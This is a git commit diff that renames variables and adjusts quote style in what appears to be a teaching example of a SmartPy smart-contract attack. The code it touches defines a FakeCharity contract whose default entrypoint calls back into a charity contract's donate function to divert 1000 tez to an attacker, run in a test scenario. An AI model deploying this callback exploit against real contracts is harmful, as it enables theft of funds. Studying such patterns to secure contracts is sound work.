8390e0e121b61c6c2cf41b811971fc636775340b
maximezouzou <104771834+maximezouzou@users.noreply.github.com>
2023-09-14 16:35:26 +0200

    Guideline update

--- Examples/19_fakeCharityAttack.py
+++ Examples/19_fakeCharityAttack.py
@@ -19,20 +19,20 @@ def main():
             pass
            
     class FakeCharity(sp.Contract):
-        def __init__(self, attackedContract, attacker):
-            self.data.attackedContract = attackedContract
+        def __init__(self, attacked_contract, attacker):
+            self.data.attacked_contract = attacked_contract
             self.data.attacker = attacker
 
         @sp.entrypoint
         def default(self):
             charity_contract = sp.contract(sp.record(donation = sp.mutez, charity = sp.address),
-                                           self.data.attackedContract,
+                                           self.data.attacked_contract,
                                            entrypoint="donate").unwrap_some()
             sp.transfer(sp.record(donation = sp.tez(1000), charity = self.data.attacker),
                         sp.tez(0),
                         charity_contract)
 
-@sp.add_test(name='Testing charity attack')
+@sp.add_test(name="Testing charity attack")
 def test():
     admin = sp.test_account("admin").address
     attacker = sp.test_account("attacker").address
@@ -41,7 +41,7 @@ def test():
     scenario += charityFund
     charityFund.deposit().run(amount = sp.tez(10000), sender = admin)
 
-    fakeCharity = main.FakeCharity(attackedContract = charityFund.address, attacker = attacker)
+    fakeCharity = main.FakeCharity(attacked_contract = charityFund.address, attacker = attacker)
     scenario += fakeCharity
     charityFund.donate(donation = sp.tez(1), charity = fakeCharity.address).run(sender = admin)
 
